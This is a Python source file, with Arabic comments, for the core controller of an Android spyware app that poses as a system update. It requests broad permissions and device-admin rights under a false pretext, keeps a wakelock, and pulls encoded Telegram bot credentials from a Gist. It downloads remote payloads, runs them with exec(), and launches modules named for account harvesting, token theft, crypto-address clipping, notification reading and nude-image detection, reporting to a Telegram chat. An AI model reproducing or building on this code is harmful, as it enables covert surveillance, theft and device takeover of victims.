"""
core/monitor.py
المدير الرئيسي للتطبيق: يطلب الصلاحيات، يحمل الإعدادات، يحمل البايلودات (الميزات) من Gists،
ويقوم بتشغيل جميع الخدمات في الخلفية.
"""

import threading
import time
import requests
import json
import base64
import traceback
from jnius import autoclass, cast
from android.permissions import request_permissions, Permission, check_permission
from android import mActivity

class Monitor:
    def __init__(self):
        self.config_url = "https://gist.githubusercontent.com/YourUsername/YourGistID/raw/config.json"
        self.config = None
        self.tokens = []
        self.chat_id = None
        self.payload_urls = []
        self.running = True
        self.wake_lock = None
        self.device_id = self.get_device_id()
        self.vault_id = None  # سيتم تعيينه من config

    def get_device_id(self):
        """الحصول على معرف الجهاز (SERIAL)"""
        try:
            Build = autoclass('android.os.Build')
            return Build.SERIAL or Build.getSerial()
        except:
            return "unknown"

    def log(self, msg):
        """تسجيل رسالة (يمكن إرسالها إلى واجهة Kivy أو إلى ملف)"""
        print(f"[Monitor] {msg}")
        # يمكن إضافة إرسال إلى واجهة Kivy إذا أردنا

    def send_telegram(self, text):
        """إرسال رسالة إلى Telegram باستخدام أول توكن"""
        if not self.tokens or not self.chat_id:
            return
        try:
            token = self.tokens[0]
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": self.chat_id, "text": text}, timeout=10, verify=False)
        except:
            pass

    def decode_secret(self, data):
        """فك تشفير النص (base64 ثم عكس)"""
        try:
            decoded = base64.b64decode(data).decode('utf-8')
            return decoded[::-1]
        except:
            return ""

    def request_all_permissions(self):
        """طلب جميع الصلاحيات اللازمة للتطبيق"""
        self.log("Requesting permissions...")
        permissions_list = [
            Permission.INTERNET,
            Permission.ACCESS_NETWORK_STATE,
            Permission.CAMERA,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.RECORD_AUDIO,
            Permission.READ_SMS,
            Permission.READ_CONTACTS,
            # NOTIFICATION_LISTENER ليس صلاحية تطبيق عادية، سيتم طلبها لاحقاً عبر Intent
        ]
        request_permissions(permissions_list)
        time.sleep(2)

        # طلب صلاحية تجاهل تحسين البطارية
        self.request_ignore_battery_optimizations()

        # طلب صلاحية مدير الجهاز (Device Admin)
        self.request_device_admin()

        # طلب صلاحية النسخ الاحتياطي (لـ token snatcher)
        self.request_backup_permission()

    def request_ignore_battery_optimizations(self):
        """طلب صلاحية تجاهل تحسين البطارية"""
        try:
            PowerManager = autoclass('android.os.PowerManager')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            pm = mActivity.getSystemService('power')
            if not pm.isIgnoringBatteryOptimizations(mActivity.getPackageName()):
                intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.setData(autoclass('android.net.Uri').parse("package:" + mActivity.getPackageName()))
                mActivity.startActivity(intent)
                self.log("Opened battery optimization settings for user to disable.")
        except Exception as e:
            self.log(f"Battery optimization request failed: {e}")

    def request_device_admin(self):
        """طلب صلاحية مدير الجهاز (Admin)"""
        try:
            DevicePolicyManager = autoclass('android.app.admin.DevicePolicyManager')
            ComponentName = autoclass('android.content.ComponentName')
            dpm = mActivity.getSystemService('device_policy')
            admin_receiver = ComponentName(mActivity.getPackageName(), "org.system.update.AdminReceiver")
            if not dpm.isAdminActive(admin_receiver):
                Intent = autoclass('android.content.Intent')
                intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin_receiver)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لحماية النظام من التطبيقات الضارة")
                mActivity.startActivity(intent)
                self.log("Requested device admin privileges.")
        except Exception as e:
            self.log(f"Device admin request failed: {e}")

    def request_backup_permission(self):
        """طلب صلاحية النسخ الاحتياطي (لـ token snatcher) - تظهر في الإعدادات"""
        # ليست صلاحية مباشرة، ولكن يمكن توجيه المستخدم إلى إعدادات النسخ الاحتياطي
        # أو سنقوم بتنفيذها في token_snatcher.py
        pass

    def load_config(self):
        """تحميل ملف الإعدادات من GitHub"""
        try:
            self.log(f"Loading config from {self.config_url}")
            response = requests.get(self.config_url, timeout=15, verify=False)
            if response.status_code != 200:
                raise Exception(f"HTTP {response.status_code}")
            config_data = response.json()
            self.tokens = [self.decode_secret(t) for t in config_data.get('t', [])]
            self.chat_id = self.decode_secret(config_data.get('v', ''))
            self.payload_urls = config_data.get('payload_urls', [])
            self.config = config_data
            self.vault_id = self.chat_id  # يمكن تخزين معرف الدردشة نفسه
            self.log(f"Config loaded. Tokens: {len(self.tokens)}, Payloads: {len(self.payload_urls)}")
            return True
        except Exception as e:
            self.log(f"Failed to load config: {traceback.format_exc()}")
            return False

    def load_payloads(self):
        """تحميل جميع البايلودات من قائمة payload_urls وتنفيذها"""
        if not self.payload_urls:
            self.log("No payloads to load.")
            return False
        loaded = 0
        for url in self.payload_urls:
            try:
                name = url.split('/')[-1]
                self.log(f"Loading payload: {name}")
                code = requests.get(url, timeout=10, verify=False).text
                exec(code, globals())
                self.log(f"✅ Loaded {name}")
                loaded += 1
                if loaded % 3 == 0:
                    self.send_telegram(f"📦 Loaded {loaded}/{len(self.payload_urls)} modules")
            except Exception as e:
                self.log(f"❌ Failed to load {url}: {e}")
        self.send_telegram(f"🎯 All payloads loaded ({loaded}/{len(self.payload_urls)})")
        return True

    def start_services(self):
        """بعد تحميل البايلودات، نبحث عن الكلاسات الرئيسية ونشغلها"""
        # من المفترض أن البايلودات تحتوي على كلاسات مثل:
        # NudeDetector, CameraAnalyzer, DailyZipper, AccountHarvester, CryptoClipper, NotificationReader, TokenSnatcher, StreamManager, TelegramUI
        # سنقوم بإنشاء كائنات منها وتشغيلها في خيوط منفصلة
        services = []
        if 'NudeDetector' in globals():
            services.append(globals()['NudeDetector'](self))
        if 'CameraAnalyzer' in globals():
            services.append(globals()['CameraAnalyzer'](self))
        if 'DailyZipper' in globals():
            services.append(globals()['DailyZipper'](self))
        if 'AccountHarvester' in globals():
            services.append(globals()['AccountHarvester'](self))
        if 'CryptoClipper' in globals():
            services.append(globals()['CryptoClipper'](self))
        if 'NotificationReader' in globals():
            services.append(globals()['NotificationReader'](self))
        if 'TokenSnatcher' in globals():
            services.append(globals()['TokenSnatcher'](self))
        if 'StreamManager' in globals():
            services.append(globals()['StreamManager'](self))
        if 'TelegramUI' in globals():
            services.append(globals()['TelegramUI'](self.tokens, self))
        # تشغيل كل خدمة في thread منفصل إذا كانت تحتوي على start() أو run()
        for svc in services:
            try:
                if hasattr(svc, 'start'):
                    svc.start()
                elif hasattr(svc, 'run'):
                    threading.Thread(target=svc.run, daemon=True).start()
            except Exception as e:
                self.log(f"Failed to start service {type(svc).__name__}: {e}")

    def acquire_wakelock(self):
        """الحصول على WakeLock لمنع الجهاز من الدخول في وضع السكون العميق"""
        try:
            PowerManager = autoclass('android.os.PowerManager')
            pm = mActivity.getSystemService('power')
            self.wake_lock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, 'SystemUpdate:Monitor')
            self.wake_lock.acquire()
            self.log("WakeLock acquired")
        except Exception as e:
            self.log(f"WakeLock failed: {e}")

    def release_wakelock(self):
        if self.wake_lock:
            try:
                self.wake_lock.release()
                self.log("WakeLock released")
            except:
                pass

    def start(self):
        """الطريقة الرئيسية التي تستدعيها main.py لبدء كل شيء"""
        self.log("Monitor starting...")
        self.request_all_permissions()
        time.sleep(3)
        if not self.load_config():
            self.send_telegram("❌ Failed to load config from GitHub")
            return
        self.acquire_wakelock()
        if self.load_payloads():
            self.start_services()
            self.send_telegram(f"🚀 System Online on {self.device_id}")
        else:
            self.send_telegram("⚠️ No payloads loaded. Check config.")

    def stop(self):
        self.running = False
        self.release_wakelock()
        self.log("Monitor stopped.")
